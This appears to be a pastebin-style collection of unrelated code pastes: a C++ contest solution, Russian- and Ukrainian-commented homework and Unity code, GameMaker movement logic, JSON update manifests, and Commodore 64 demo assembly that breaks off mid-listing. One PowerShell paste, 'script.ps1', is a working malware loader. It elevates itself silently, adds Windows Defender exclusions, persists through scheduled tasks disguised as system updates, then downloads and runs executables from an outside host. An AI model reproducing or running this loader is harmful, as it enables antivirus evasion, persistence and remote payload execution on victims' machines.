    vector<ll> res;
    for (int p : primes) {
        if ((ll)p * p > x) break;
        if (x % p == 0) {
            res.push_back(p);
            while (x % p == 0) x /= p;
        }
    }
    if (x > 1) res.push_back(x);
    return res;
}
 
int main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);
    int T;
    if (!(cin >> T)) return 0;
 
    int sieve_limit = 200000;
    auto primes = sieve_primes(sieve_limit);
 
    while (T--) {
        int n;
        cin >> n;
        vector<ll> a(n);
        vector<ll> b(n);
        for (int i = 0; i < n; ++i) cin >> a[i];
        for (int i = 0; i < n; ++i) cin >> b[i];
 
        unordered_map<ll, vector<int>> orig_idx;
        unordered_map<ll, vector<int>> plus_idx;
 
        for (int i = 0; i < n; ++i) {
            auto facs = factor_unique(a[i], primes);
            for (ll p : facs) orig_idx[p].push_back(i);
 
            auto facs_plus = factor_unique(a[i] + 1, primes);
            for (ll p : facs_plus) plus_idx[p].push_back(i);
        }
 
        bool zero = false;
        for (auto &kv : orig_idx) {
            if (kv.second.size() >= 2) { zero = true; break; }
        }
        if (zero) {
            cout << 0 << '\n';
            continue;
        }
 
        bool one = false;
        for (auto &kv : plus_idx) {
            ll p = kv.first;
            const auto &plusvec = kv.second;
 
            if (!orig_idx.count(p)) continue;
            const auto &origvec = orig_idx[p];
 
            if (origvec.empty()) continue;
            int idx0 = origvec[0];
            for (int j : plusvec) {
                if (j != idx0) { one = true; break; }
            }
            if (one) break;
        }
        if (one) {
            cout << 1 << '\n';
            continue;
        }
 
        
        cout << 2 << '\n';
    }
    return 0;
}"
fZSsNGz0,Untitled,3x3cvte,Python,Sunday 19th of October 2025 12:18:24 PM CDT,"import pandas as pd

# Загрузка файла
df = pd.read_csv(""diamonds.csv"")

print(""Ответы теста EDA HW pract"")
print(""---"")
print()

num_rows = df.shape[0]
print(""Количество строк в датасете:"", num_rows)
print(""---"")

missing_cut = df['Cut'].isna().sum()
print(""Пропущенных значений в столбце Cut:"", missing_cut)
print(""---"")

mean_price = round(df['Price'].mean())
print(""Среднее значение Price:"", mean_price)
print(""---"")

median_price = df['Price'].median()
print(""Медианное значение Price:"", median_price)
print(""---"")

min_carat = df['Carat Weight'].min()
max_carat = df['Carat Weight'].max()

print(""минимальное и максимальное значение Carat Weight:"")
print(f""{min_carat} ; {max_carat}"")
print(""---"")

# Средняя цена по каждой форме
mean_price_by_shape = df.groupby('Shape')['Price'].mean()

# Форма с максимальной средней ценой
shape_max_price = mean_price_by_shape.idxmax()
print(""Форма с самой высокой средней ценой:"", shape_max_price)
print(""---"")

# Средняя цена по каждому цвету
mean_price_by_color = df.groupby('Color')['Price'].mean()

# Цвет с минимальной средней ценой
color_min_price = mean_price_by_color.idxmin()
print(""Цвет с наименьшей средней ценой:"", color_min_price)
print(""---"")

corr = df['Carat Weight'].corr(df['Price'])
print(""Корреляция:"", round(corr, 2))
print(""---"")

mean_depth = round(df['Depth %'].mean(), 1)
print(""Среднее значение Depth %:"", mean_depth)
print(""---"")

mean_price_by_type = df.groupby('Type')['Price'].mean()

# Тип с максимальной средней ценой
type_max_price = mean_price_by_type.idxmax()
print(""Тип с более высокой средней ценой:"", type_max_price)
print(""---"")"
bxgB4PBa,The Sweet Kitty Motions (platformer push/carry movement),sylvie_ln,Game Maker,Sunday 19th of October 2025 12:11:50 PM CDT,"function move_init() {
  moveable = false;  // can be pushed or carried
  can_push = false;  // can push things
  can_carry = false; // can carry things
  carry_dist = {l:0, r:0} // how far the object has been carried left or right
  subpixel=[0,0]; 
  collision_at = function(xp,yp) {
    // can override for custom collision behaviour
    return !place_free(xp,yp);
  }
}

// call this in begin step, it should run every frame before calls to move
function move_bstep() {
  if moveable {
    carry_dist = {l:0,r:0}
  }
}

// internal function for resetting positions after a push fails
function _move_reset(reset) {
  if is_array(reset) {
    for(var i=0; i<array_length(reset); ++i) {
      var data = reset[i]; 
      if instance_exists(data.id) {
        data.id.x = data.x;
        data.id.y = data.y;
      }
    }
  }
}

function move(amount, axis) {
  // split the amount into pixel movement (target) and subpixel movement
  // we use ceil(n - 1/2) instead of round(n) so that round(#.5) always rounds down
  // ensures subpixel range is precisely -0.5 <= subpixel < 0.5
  // this is important for vertical carrying, if i remember right
  var target = ceil(subpixel[axis] + amount - 1/2);
  subpixel[axis] += amount - target;

  // shorthands:
  var xa = 1-axis;       // true if we're moving on the x-axis
  var ya = axis;         // true if we're moving on the y-axis
  var s = sign(target);  // direction of movement

  // temporaries:
  var souls = undefined; // holds other pushable/carriable objects we collide with
  var reset = undefined; // holds reset info, if we need to take back a sequence of moves
  var dist = 0;          // total pixel distance we have moved 

  // now move towards the target, one pixel at a time
  while target != 0 {

    // before moving, try to push objects out of the way
    if (xa and can_push)                              // pushing horizontally
    or ((ya and s < 0) and can_carry)                 // or carrying an object on top of us
    or ((ya and s > 0) and can_push and !moveable) {  // or pushing an object below us
      // clear the reset data
      reset = [];
      // we temporarily toggle our moveableness off
      // it's to avoid infinite loops (the thing we push tries to push us, etc.)
      var moveable_restore = moveable;
      moveable = false;

      // gather all souls in our path and push them
      souls = instance_place_array(x+xa*s,y+ya*s,oSoul);
      for(var i=0; i<array_length(souls); ++i) {
        var soul = souls[i];
        // if we can push the soul, try to push it
        if soul.moveable {
          // add the soul to the reset data, in case we need to revert the push
          array_push(reset,{id: soul.id, x:soul.x, y:soul.y});
          // now do the actual push
          // note that this might recursively push or carry other things!
          with soul {
            move(s,axis); 
          }
        }
      }

      // restore our original moveable status
      moveable = moveable_restore;
    }

    // now, check for a collision one step ahead
    if collision_at(x+xa*s,y+ya*s) {
      // we hit something, abort!

      // this first part is optional
      // you can do a collision callback for any souls you collided with
      souls = instance_place_array(x+xa*s,y+ya*s,oSoul);
      for(var i=0; i<array_length(souls); ++i) {
        var soul = souls[i];
        with soul {
          with other {
            // callback goes here
            // ""self"" is the soul that move was called on
            // ""other"" is the soul we collided with
            // on_collide(xa,ya,s); 
          }
        }
      }

      // this part is not optional
      // if we pushed things, but then were unable to move ourselves,
      // that means the push failed at some point
      // reset the positions of everything we pushed
      if can_push {
        _move_reset(reset); 
      }
 
      // this part comes down to personal preference
      // when you hit a wall there are various things you can do with subpixels
      // set to 0, set to bounds of subpixel range, do nothing etc.
      subpixel[axis] = 0

      // returning true indicates movement was successful
      // returning false indicates we hit something
      // you could customize this to return more complex data if you need it
      return false;  
    }

    // there is nothing in our way, so we're going to move
    // before moving, determine what needs to be carried
    // we only carry objects that are riding on top of us
    if can_carry {
      souls = instance_place_array(x,y-1,oSoul);
    }

    // finally, we actually move one pixel
    x += xa*s;
    y += ya*s;
    target -= s;
    dist++;

    // now that we've moved, carry things along with us
    if can_carry {
      // again we temporarily toggle our moveableness off 
      // to avoid infinite carry loops
      var moveable_restore = moveable;
      moveable = false;
 
      // finally, carrying time
      for(var i=0; i<array_length(souls); ++i) {
        var soul = souls[i];
        if soul.moveable {
          with soul {
            if xa { // if we're carrying to the left or right
              // we keep track of the maximum distance, per-step, the object has been carried
              // separate left and right distances are tracked, the count is reset in begin step
              // we only do the carry if it will increase the maximum distance in that direction
              // why? this is to avoid the ""double carry problem"":
              // imagine a soul is standing on top of two souls, both moving left
              // the soul on top gets carried 2px for every 1px the bottom ones move, this shouldn't happen
              // i don't have a mathematical proof this carry rule is correct or anything
              // but i think it worked well in my experiments
              // anyways
              if s < 0 {
                if dist > carry_dist.l {
                  carry_dist.l++;
                  move(s,axis);
                }
              } else {
                if dist > carry_dist.r {
                  carry_dist.r++;
                  move(s,axis);
                }
              }
            } else if ya { 
              // only triggers if we're carrying downwards (an upwards carry is a push)
              move(s,axis); 
            }
          }
        }
      }
      
      // restore moveable status
      moveable = moveable_restore;
    }
  }

  // we're out of the while loop which means we moved the full target distance without hitting anything
  return true;
}"
46bZW1j6,How to Load TMP with tags use Addressables,waygeek,C#,Sunday 19th of October 2025 10:50:04 AM CDT,"using System.Collections.Generic;
using Cysharp.Threading.Tasks;
using UnityEngine;
using UnityEngine.Localization;
using UnityEngine.Localization.Settings;
using UnityEngine.AddressableAssets;
using UnityEngine.ResourceManagement.AsyncOperations;
using WayHeart.Infrastructure.State;
using WayHeart.Service.Audio;
using Constant;
using WayHeart.Service.Loader;
using TMPro;

public class BootstrapState : IStateGame
{
    private readonly GameStateMachine _gameStateMachine;
    private readonly AudioService _audioService;
    readonly AssetLoader _assetLoader;

    public BootstrapState(GameStateMachine gameStateMachine, AudioService audioService, AssetLoader assetLoader)
    {
        _gameStateMachine = gameStateMachine;
        _audioService = audioService;
        _assetLoader = assetLoader;
    }

    public async UniTask Enter()
    {
        await StartBackgroundResourceLoading();
        
        await _gameStateMachine.Enter<LoadMainMenuState>();
    }

    public UniTask Exit()
    {
        return UniTask.CompletedTask;
    }

    private async UniTask StartBackgroundResourceLoading()
    {
        _assetLoader.LoadAssetAsync<AudioClip>(ConstantAudioName.DefaultClick).Forget();
        _assetLoader.LoadAssetAsync<AudioClip>(ConstantAudioName.DefaultDeny).Forget();

        _audioService.Ambient.PlayWhenReadyAsync(ConstantAudioName.MainMenuAmbient, true).Forget();

        // Завантажуємо шрифти та локалізацію паралельно
        await UniTask.WhenAll(
            LoadFontsAsync(),
            LoadLocalization()
        );
    }

    private async UniTask LoadLocalization()
    {
        await LocalizationSettings.InitializationOperation;

        LoadSavedLanguage();

        await PreloadMainMenuTables();
    }

    private void LoadSavedLanguage()
    {
        string savedLangCode = PlayerPrefs.GetString(""SelectedLanguage"", """");

        if (!string.IsNullOrEmpty(savedLangCode))
        {
            Locale savedLocale = LocalizationSettings.AvailableLocales.GetLocale(new LocaleIdentifier(savedLangCode));

            if (savedLocale != null)
            {
                LocalizationSettings.SelectedLocale = savedLocale;
                return;
            }
        }

        Locale deviceLocale = LocalizationSettings.AvailableLocales.GetLocale(Application.systemLanguage);

        LocalizationSettings.SelectedLocale = 
            deviceLocale != null ? deviceLocale : LocalizationSettings.AvailableLocales.Locales[0];
    }

    private async UniTask PreloadMainMenuTables()
    {
        var stringDatabase = LocalizationSettings.StringDatabase;

        var mainMenuTable = stringDatabase.GetTableAsync(ConstantLocalizationTabelName.MainMenu).ToUniTask();
        var popupTable = stringDatabase.GetTableAsync(ConstantLocalizationTabelName.Popup).ToUniTask();

        await UniTask.WhenAll(mainMenuTable, popupTable);
    }

    /// <summary>
    /// Завантажує TextMesh Pro шрифти через Addressables.
    /// Шрифти необхідні для TMP Fallback системи (емоджі та тег font) і мають бути в пам'яті до показу UI.
    /// </summary>
    private async UniTask LoadFontsAsync()
    {
        // Назви шрифтів з Addressables
        string[] fontNames = new[]
        {
            ""FramerSans300 SDF"",
            ""FramerSans400 SDF"",
            ""FramerSans600 SDF""
        };

        // Завантажуємо всі шрифти паралельно та отримуємо результати через кортежі
        var (font300, font400, font600) = await UniTask.WhenAll(
            LoadSingleFontAsync(fontNames[0]),
            LoadSingleFontAsync(fontNames[1]),
            LoadSingleFontAsync(fontNames[2])
        );

        // Перевіряємо що всі шрифти успішно завантажились
        if (font300 != null && font400 != null && font600 != null)
        {
            // Оновлюємо TMP Settings щоб теги <font=""FontName""> працювали з новими екземплярами шрифтів
            TMP_Settings.fallbackFontAssets = new List<TMP_FontAsset> { font300, font400, font600 };
            TMP_Settings.defaultFontAsset = font300;

            // Оновлюємо внутрішню таблицю TMP для пошуку шрифтів через теги <font>
            MaterialReferenceManager.AddFontAsset(font300);
            MaterialReferenceManager.AddFontAsset(font400);
            MaterialReferenceManager.AddFontAsset(font600);
        }
        else
        {
            Debug.LogWarning(""❌ Не всі шрифти завантажились. TMP Settings не оновлено."");
        }
    }

    /// <summary>
    /// Завантажує окремий TMP шрифт через Addressables.
    /// При помилці логує її, але не блокує загрузку (graceful degradation).
    /// </summary>
    private async UniTask<TMP_FontAsset> LoadSingleFontAsync(string fontName)
    {
        try
        {
            var handle = Addressables.LoadAssetAsync<TMP_FontAsset>(fontName);
            await handle.ToUniTask();

            if (handle.Status == AsyncOperationStatus.Succeeded)
            {
                Debug.Log($""✓ Завантажено шрифт: {fontName}"");
                return handle.Result;
            }
            else
            {
                Debug.LogWarning($""❌ Помилка завантаження шрифту {fontName}: {handle.OperationException}"");
                return null;
            }
        }
        catch (System.Exception ex)
        {
            // Не блокуємо запуск гри при помилці завантаження шрифтів
            Debug.LogWarning($""❌ Помилка завантаження шрифту {fontName}: {ex.Message}"");
            return null;
        }
    }
}
"
PMaEHmf3,Untitled,3327107649,JSON,Sunday 19th of October 2025 09:49:06 AM CDT,"{
  ""version"": ""v2.2.0"",
  ""versionCode"": 20251019,
  ""zipUrl"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/MultiGameCleaner.zip"",
  ""changelog"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/README.md""
}"
STyBrwUt,Untitled,3327107649,JSON,Sunday 19th of October 2025 09:37:13 AM CDT,"{
  ""version"": ""v2.4.0"",
  ""versionCode"": 20251019,
  ""zipUrl"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/MultiGameCleaner.zip"",
  ""changelog"": ""https://54188-1348480182.cos.ap-nanjing.myqcloud.com/README.md""
}"
R5mC3CKX,ДЗ: Динамический массив,NikaBang,C#,Sunday 19th of October 2025 09:16:15 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        const string CommandSum = ""sum"";
        const string CommandExit = ""exit"";

        int[] numbers = [];
        int sum = 0;
        bool inProgram = true;

        while (inProgram)
        {
            Console.Clear();
            Console.Write(""Массив чисел: "");

            foreach (int number in numbers)
            {
                Console.Write(number + "" "");
            }

            Console.Write($""\n{CommandSum} - Вывести сумму массива чисел."" +
                $""\n{CommandExit} - Завершить программу."" +
                $""\nЛюбое число для добавления в массив."" +
                $""\nВвод: "");

            string userInput = Console.ReadLine();

            switch (userInput)
            {
                case CommandSum:
                    foreach (int number in numbers)
                    {
                        sum += number;
                    }

                    Console.WriteLine($""Сумма массива - {sum}."");
                    break;
                case CommandExit:
                    Console.WriteLine(""Программа завершена."");
                    inProgram = false;
                    break;
                default:
                    int[] tempNumbers = new int[numbers.Length + 1];

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        tempNumbers[i] = numbers[i];
                    }

                    tempNumbers[tempNumbers.Length - 1] = Convert.ToInt32(userInput);
                    numbers = tempNumbers;
                    break;
            }

            Console.ReadKey();
        }
    }
}"
79nkyS7i,script.ps1,Marc1n,PowerShell,Sunday 19th of October 2025 09:06:09 AM CDT,"param([switch]$FromLoader)

$ErrorActionPreference = 'SilentlyContinue'

function IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

$appData = $env:APPDATA
$localAppData = $env:LOCALAPPDATA
$tmp = $env:TEMP
$selfPath = $MyInvocation.MyCommand.Path
$markerPath = Join-Path $tmp 'admin.tmp'
$targetPath = Join-Path $appData (Split-Path -Leaf $selfPath)

if ($selfPath -ne $targetPath) {
    Copy-Item -Path $selfPath -Destination $targetPath -Force
}

$args = $args -join ' '

if (Test-Path $markerPath -and -not ($args -like '*--fromloader*')) { exit }

if (-not (IsAdmin) -and -not ($args -like '*--fromloader*')) {
    Start-Process -FilePath 'cmd.exe' -ArgumentList ""/c powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `""$selfPath`"" --fromloader --detached"" -Verb RunAs -WindowStyle Hidden
    exit
}

if (-not ($args -like '*--detached*')) {
    Start-Process -FilePath 'powershell.exe' -ArgumentList ""-WindowStyle Hidden -ExecutionPolicy Bypass -File `""$selfPath`"" --fromloader --detached"" -WindowStyle Hidden
    exit
}

New-Item -Path $markerPath -ItemType File -Force | Out-Null


$exclScriptPath = Join-Path $appData ""exclusions.ps1""

$exclScript = @'
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList ""-Command Add-MpPreference -ExclusionPath `'$env:APPDATA`'""
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList ""-Command Add-MpPreference -ExclusionPath `'$env:LOCALAPPDATA`'""
Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList ""-Command Add-MpPreference -ExclusionPath `'$env:ProgramData`'""
'@

Set-Content -Path $exclScriptPath -Value $exclScript -Force -Encoding UTF8

$taskName2 = 'SystemUpdates'
$exclCmd = ""powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `""$exclScriptPath`""""
schtasks /delete /tn $taskName2 /f >$null 2>&1
schtasks /create /tn $taskName2 /tr $exclCmd /sc onlogon /f /RL HIGHEST


$taskName = 'WinUpd'
$exeCommand = ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `""$targetPath`"" --fromloader --detached""
schtasks /delete /tn $taskName /f >$null 2>&1
schtasks /create /tn $taskName /tr $exeCommand /sc onlogon /f /RL HIGHEST


$zipUrl = 'https://21gweweqax.online/api.php'
$zipPath = Join-Path $tmp 'app.zip'

try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
} catch { exit }

do {
    $rndFolder = 'tmp' + (Get-Random -Minimum 100000 -Maximum 999999)
    $unzipDir = Join-Path $tmp $rndFolder
} while (Test-Path $unzipDir)

New-Item -ItemType Directory -Path $unzipDir | Out-Null

$shellApp = New-Object -ComObject Shell.Application
$zip = $shellApp.NameSpace($zipPath)
$dest = $shellApp.NameSpace($unzipDir)

if ($zip -and $dest) {
    $dest.CopyHere($zip.Items(), 4)
}

Get-ChildItem -Path $unzipDir -Filter *.exe | ForEach-Object {
    Start-Process $_.FullName
    return
}"
VMrMiYYD,ДЗ: Локальные максимумы,NikaBang,C#,Sunday 19th of October 2025 08:38:58 AM CDT,"internal class Program
{
    static void Main(string[] args)
    {
        int[] numbers = new int[30];
        int minRandom = 1;
        int maxRandom = 100;
        int lastIndex = numbers.Length - 1;
        Random random = new Random();

        for (int i = 0; i < numbers.Length; i++)
        {
            numbers[i] = random.Next(minRandom, maxRandom);
            Console.Write(numbers[i] + "" "");
        }

        Console.WriteLine();

        if (numbers[0] > numbers[1])
        {
            Console.Write(numbers[0] + "" "");
        }

        for (int i = 1; i < lastIndex; i++)
        {
        	if (numbers[i] > numbers[i + 1] && numbers[i] > numbers[i - 1])
        	{
        		Console.Write(numbers[i] + "" "");
        	}
        }

        if (numbers[lastIndex] > numbers[lastIndex - 1])
        {
            Console.Write(numbers[lastIndex] + "" "");
        }
    }
}"
fhjKB9p2,8 найти кол-во,nq1s788,Python,Sunday 19th of October 2025 08:03:31 AM CDT,"#https://inf-ege.sdamgia.ru/problem?id=17328
alph = 'ГЕРАСИМ'
gl = 'ЕАИ'
sogl = 'ГРСМ'
cnt = 0
for q in alph:
    for w in alph:
        for e in alph:
            for r in alph:
                for t in alph:
                    for y in alph:
                        for u in alph:
                            s = q + w + e + r + t + y + u
                            if len(set(s)) != 7:
                                continue
                            f = True
                            for i in range(1, 7):
                                if not ((s[i - 1] in gl and s[i] in sogl) or (s[i - 1] in sogl and s[i] in gl)):
                                    f = False
                            if f:
                                cnt += 1
print(cnt)"
2FZ0XAdg,At The Station,felixnardella,6502 TASM/64TASS,Sunday 19th of October 2025 07:51:53 AM CDT,"; ================================================================
; AT THE STATION - Commodore 64 One File Demo
; ================================================================
; FlashParty 2025 - 3rd Place in ""Mixed Demo"" Category
; https://flashparty.rebelion.digital/
;
; Credits:
;   Code & Graphics: Kimono (Felice Nardella)
;   Music: Manganoid (Zack Maxis) - SID: ""Beli_Jablane""
;   Group: Hokuto Force
;
; Assembly: 64tass (https://sourceforge.net/projects/tass64/)
; Compile: 64tass -a atthestation.asm -o atthestation.prg
; Download: https://csdb.dk/release/?id=256787
;
; Description:
;   A demo featuring a spiral intro animation, text messages,
;   animated escalator effect with sprites, and horizontal
;   scrolling synchronized with raster interrupts.
;
; Note:
;   The horizontal text scrolling routine is based on
;   Attilio Capuozzo's original code and ideas.
; ================================================================


* = $c000

; ================================================================
; CONSTANTS
; ================================================================
VIC_BASE = $d000              ; VIC-II Base Address (53248)

SPR_PTR = $07f8               ; Sprite 0 pointer address (2040)
SPR_PTR1 = $07f9              ; Sprite 1 pointer address (2041)
SPR_PTR2 = $07fa              ; Sprite 2 pointer address (2042)
SPR_PTR3 = $07fb              ; Sprite 3 pointer address (2043)
SPR_PTR4 = $07fc              ; Sprite 4 pointer address (2044)
SPR_PTR5 = $07fd              ; Sprite 5 pointer address (2045)
SPR_PTR6 = $07fe              ; Sprite 6 pointer address (2046)

NMIRoutine = $fec1            ; Address of default NMI Handler last instruction (RTI)

; Raster line variables
rast_1 = $80                  ; First raster interrupt line
rast_2 = $bc                  ; Second raster interrupt line (188)

; Pointer variables
src_ptr = $02                 ; Pointer to source table
dest_ptr = $2a                ; Pointer to screen destination

; ================================================================
; SPIRAL INTRO ANIMATION
; ================================================================

        ; Initialize b, w, z variables
        lda #39
        sta $50         ; b = 39 (right boundary)
        lda #0
        sta $51         ; w = 0 (top boundary)
        lda #24
        sta $52         ; z = 24 (bottom boundary)

        ; Set border color to black
        lda #0
        sta $d020

        ; Initialize loop counter a = 0
        lda #0
        sta $53

; --------------------------------------------------------
; Main loop: for a = 0 to 12
; --------------------------------------------------------
loop_a:
        lda $53
        cmp #13
        bcs done_a

        ; --- Loop 1: r = w; for c = a to b
        ; Draw horizontal line across top
        lda $51
        sta $54         ; r = w
        lda $53
        sta $55         ; c = a

loop_c1:
        jsr poke_char
        jsr delay_frame
        lda $55
        cmp $50         ; Compare c with b
        beq after_c1
        inc $55
        jmp loop_c1
after_c1:

        ; --- Loop 2: c = b; for r = w to z
        ; Draw vertical line down right side
        lda $50
        sta $55         ; c = b
        lda $51
        sta $54         ; r = w

loop_r2:
        jsr poke_char
        jsr delay_frame
        lda $54
        cmp $52         ; Compare r with z
        beq after_r2
        inc $54
        jmp loop_r2
after_r2:

        ; --- Loop 3: r = z; for c = b down to a
        ; Draw horizontal line across bottom (right to left)
        lda $52
        sta $54         ; r = z
        lda $50
        sta $55         ; c = b

loop_c3:
        jsr poke_char
        jsr delay_frame
        lda $55
        cmp $53         ; Compare c with a
        beq after_c3
        dec $55
        jmp loop_c3
after_c3:

        ; --- Loop 4: c = a; for r = z down to w
        ; Draw vertical line up left side
        lda $53
        sta $55         ; c = a
        lda $52
        sta $54         ; r = z

loop_r4:
        jsr poke_char
        jsr delay_frame
        lda $54
        cmp $51         ; Compare r with w
        beq after_r4
        dec $54
        jmp loop_r4
after_r4:

        ; Update boundaries for next spiral iteration
        dec $50         ; b--
        inc $51         ; w++
        dec $52         ; z--
        inc $53         ; a++
        jmp loop_a

done_a:

        ; Set final color effects
        lda #0  
        sta $d021       ; Background color = black
        
        ; Set character color to light green
	lda #13
        sta $0286

; ========================
; CLEAR SCREEN
; ========================
        jsr clearscreen

; ========================
; WRITE ""trapped between nowhere and forever...""
; ========================
        ; Initialize cursor position
        lda #12
        sta $54         ; row = 12
        lda #1
        sta $55         ; column = 1

        ldx #0
nextchar1:
        lda text1,x
        beq wait1_label ; If zero terminator, exit loop
        jsr writechar
        jsr beep        ; Sound effect
        inx
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        bne nextchar1

wait1_label:
        ; Wait for effect
        ldy #$ff
waitloop1:
        jsr delay_frame
        dey
        bne waitloop1
waitloop2:
        jsr delay_frame
        dey
        bne waitloop2


; ========================
; CLEAR SCREEN
; ========================
        jsr clearscreen

; ========================
; WRITE ""with no escape.""
; ========================
        ; Initialize position for second text
        lda #12
        sta $54         ; row = 12
        lda #13
        sta $55         ; column = 13

        ldx #0
nextchar2:
        lda text2,x
        beq wait2_label
        jsr writechar
        jsr beep        ; Sound effect
        inx
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        bne nextchar2

wait2_label:
        ; Wait for effect
        ldy #$ff
waitloop3:
        jsr delay_frame
        dey
        bne waitloop3

        ; Final color flash effects
        lda #1
        sta $d020       ; Border = white
        sta $d021       ; Background = white

        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame

        lda #7
        sta $d020       ; Border = yellow
        sta $d021       ; Background = yellow

        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame
        jsr delay_frame

        lda #0
        sta $d020       ; Border = black
        sta $d021       ; Background = black

done:
        jmp start

; ================================================================
; SUBROUTINE: delay_frame
; Simple delay routine (preserves all registers)
; ================================================================
delay_frame:
        pha
        txa
        pha
        tya
        pha
        
        ldx #$15
delay_outer:
        ldy #$30
delay_inner:
        dey
        bne delay_inner
        dex
        bne delay_outer
        
        pla
        tay
        pla
        tax
        pla
        rts

; ================================================================
; SUBROUTINE: poke_char
; Writes a character to screen at position (r,c) stored in $54,$55
; Also sets color to black at that position
; ================================================================
poke_char:
        pha
        txa
        pha
        tya
        pha

        ; Initialize multiplication result
        lda #0
        sta $57         ; Low byte of result
        sta $58         ; High byte of result

        lda $54
        sta $59         ; Copy row to counter

        ; Multiply row by 40 (screen width)
pc_mul_loop:
        lda $59
        beq pc_mul_done

        lda $57
        clc
        adc #40
        sta $57
        lda $58
        adc #0
        sta $58

        dec $59
        jmp pc_mul_loop
pc_mul_done:

        ; Add column offset
        lda $57
        clc
        adc $55
        sta $57
        lda $58
        adc #0
        sta $58

        ; Calculate screen memory address ($0400 + offset)
        lda #$00
        clc
        adc $57
        sta $5a         ; Low byte of pointer

        lda #$04
        adc $58
        sta $5b         ; High byte of pointer

        ; Write space character ($a0) to screen
        lda #$a0
        ldy #0
        sta ($5a),y

        ; Calculate color RAM address ($d800 + offset)
        lda #$00
        clc
        adc $57
        sta $5a

        lda #$d8
        adc $58
        sta $5b

        ; Write black color (0)
        lda #0
        ldy #0
        sta ($5a),y

        pla
        tay
        pla
        tax
        pla
        rts

; ================================================================
; SUBROUTINE: writechar
; Writes character in A to screen at position ($54,$55)
; Sets color to white and increments column
; ================================================================
writechar:
        pha
        txa
        pha
        tya
        pha
        
        ; Calculate address = $0400 + row*40 + column
        lda #0
        sta $57
        sta $58
        
        lda $54
        beq write_calc_done
        
        lda #0
        sta $59
        
        ; Multiply row by 40
write_mul_loop:
        lda $57
        clc
        adc #40
        sta $57
        
        lda $58
        adc #0
        sta $58
        
        inc $59
        lda $59
        cmp $54
        bcc write_mul_loop
        
write_calc_done:
        ; Add column
        lda $57
        clc
        adc $55
        sta $57
        
        lda $58
        adc #0
        sta $58
        
        ; Build screen memory pointer
        lda #$00
        clc
        adc $57
        sta $5a
        
        lda #$04
        adc $58
        sta $5b
        
        ; Write character to screen
        pla
        tay
        pla
        tax
        pla
        
        ; Save A in temporary location
        sta $5e
        
        ldy #0
        lda $5e
        sta ($5a), y
        
        ; Write white color to color RAM
        lda $57
        sta $5a
        
        lda #$d8
        sta $5b
        
        ldy #0
        lda #1          ; White color
        sta ($5a), y
        
        ; Increment column
        inc $55
        
        rts

; ================================================================
; SUBROUTINE: clearscreen
; Clears the screen using KERNAL routine
; ================================================================
clearscreen:
        lda #$93        ; Clear screen code
        jsr $ffd2       ; KERNAL CHROUT
        rts

; ================================================================
; SUBROUTINE: beep
; Produces a short beep sound using SID chip
; ================================================================
beep:   
        lda #$0f        ; Maximum volume
        sta $d418       ; SID volume register

        lda #$00        ; Frequency low byte
        sta $d400
        lda #$a0        ; Frequency high byte
        sta $d401

        lda #$00        ; Pulse width low
        sta $d402
        lda #$08        ; Pulse width high
        sta $d403

        lda #$09        ; Attack=0, Decay=9
        sta $d405
        lda #$F0        ; Sustain=15, Release=0
        sta $d406

        lda #$11        ; Gate on + pulse waveform
        sta $d404       ; Voice 1 control

        ldy #$ff        ; Delay to hear the sound
beepl1: 
        dey
        bne beepl1

        lda #$10        ; Gate off, pulse on (stop sound)
        sta $d404
        
        rts

; ================================================================
; MAIN PROGRAM START
; ================================================================
start:
  
        ; Border and background colors are set later in sprite setup

; Copy sprite data to memory
        jsr LoadSprites

; Sprite settings

; MSB Sprite (for X coordinates > 255)
        lda #1
        sta VIC_BASE+16 ; Enable MSB for sprite 0 (flag)

; Position sprite 0 (flag)
        lda #47         ; x0 = 255 + 47 = 302
        sta VIC_BASE
        lda #121        ; y0 = 121
        sta VIC_BASE+1

; Position sprites 1-3 (standing person)
        lda #105        ; x1 = 105
        sta VIC_BASE+2
        lda #145        ; y1 = 145
        sta VIC_BASE+3

        lda #105        ; x2 = 105
        sta VIC_BASE+4
        lda #145        ; y2 = 145
        sta VIC_BASE+5

        lda #105        ; x3 = 105
        sta VIC_BASE+6
        lda #145        ; y3 = 145
        sta VIC_BASE+7

; Position sprites 4-6 (sitting person)
        lda #217        ; x4 = 217
        sta VIC_BASE+8
        lda #164        ; y4 = 164
        sta VIC_BASE+9

        lda #217        ; x5 = 217
        sta VIC_BASE+10
        lda #164        ; y5 = 164
        sta VIC_BASE+11

        lda #217        ; x6 = 217
        sta VIC_BASE+12
        lda #164        ; y6 = 164
        sta VIC_BASE+13

; Enable sprites 0-6
        lda #$7f
        sta VIC_BASE+21 ; Enable 7 sprites

; Sprite 0 colors (flag - multicolor)
        lda #1
        sta VIC_BASE+28 ; Multicolor mode for sprite 0
        lda #9
        sta VIC_BASE+37 ; Multicolor 0 = orange (53285)
        lda #3
        sta VIC_BASE+38 ; Multicolor 1 = cyan (53286)
        lda #5
        sta VIC_BASE+39 ; Sprite 0 color = green

; Sprites 1-3 colors (standing person)
        lda #8
        sta VIC_BASE+40 ; Sprite 1 color = orange
        lda #10
        sta VIC_BASE+41 ; Sprite 2 color = light red
        lda #5
        sta VIC_BASE+42 ; Sprite 3 color = green

; Sprites 4-6 colors (sitting person)
        lda #7
        sta VIC_BASE+43 ; Sprite 4 color = yellow
        lda #10
